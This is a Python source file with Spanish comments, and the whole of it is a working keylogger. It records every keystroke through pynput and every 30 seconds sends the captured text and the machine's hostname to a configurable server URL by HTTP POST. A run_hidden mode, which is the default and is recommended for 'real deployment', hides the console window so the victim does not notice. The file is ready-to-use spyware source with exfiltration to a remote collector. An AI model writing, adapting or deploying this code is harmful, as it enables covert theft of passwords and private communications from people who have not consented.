import requests
import threading
import time
import os
from pynput import keyboard

# ============================================================
# CAMBIA ESTO por la IP de tu máquina (la que tiene el servidor)
# Para saber tu IP: ipconfig -> IPv4
# ============================================================
SERVER_URL = "http://192.168.1.19:5000/log"
SEND_INTERVAL = 30  # Envía cada 30 segundos

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
        self.running = True

    def on_press(self, key):
        """Se ejecuta cada vez que se presiona una tecla"""
        try:
            # Tecla normal (letras, números, símbolos)
            keystroke = key.char
        except AttributeError:
            # Teclas especiales
            special = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.tab: "\t[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.caps_lock: "[CAPS]",
            }
            keystroke = special.get(key, f"[{key.name.upper()}]")

        with self.lock:
            self.buffer.append(keystroke)

    def send_logs(self):
        """Hilo que envía los logs cada SEND_INTERVAL segundos"""
        while self.running:
            time.sleep(SEND_INTERVAL)
            with self.lock:
                if self.buffer:
                    data = "".join(self.buffer)
                    self.buffer = []
                    try:
                        response = requests.post(
                            SERVER_URL,
                            json={
                                "keystrokes": data,
                                "hostname": os.getenv("COMPUTERNAME", "desconocido")
                            },
                            timeout=10
                        )
                        # Opcional: guardar también localmente
                        with open("keystrokes.log", "a", encoding="utf-8") as f:
                            f.write(f"[{time.ctime()}] {data}\n")
                    except:
                        pass  # Si no hay conexión, no pasa nada

    def start(self):
        """Inicia el keylogger"""
        # Hilo que envía los datos
        sender = threading.Thread(target=self.send_logs, daemon=True)
        sender.start()
        
        # Listener de teclado (bloqueante)
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def run_hidden(self):
        """Versión oculta - sin ventana (para compilar con --noconsole)"""
        # Oculta la consola en Windows
        if os.name == "nt":
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        
        sender = threading.Thread(target=self.send_logs, daemon=True)
        sender.start()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    kl = Keylogger()
    
    # Para pruebas: usa start() - puedes ver la consola
    # Para despliegue real: usa run_hidden() - no se ve nada
    
    # CAMBIA esto según lo que necesites:
    kl.run_hidden()  # Modo oculto (sin ventana)
    # kl.start()     # Modo visible (para probar)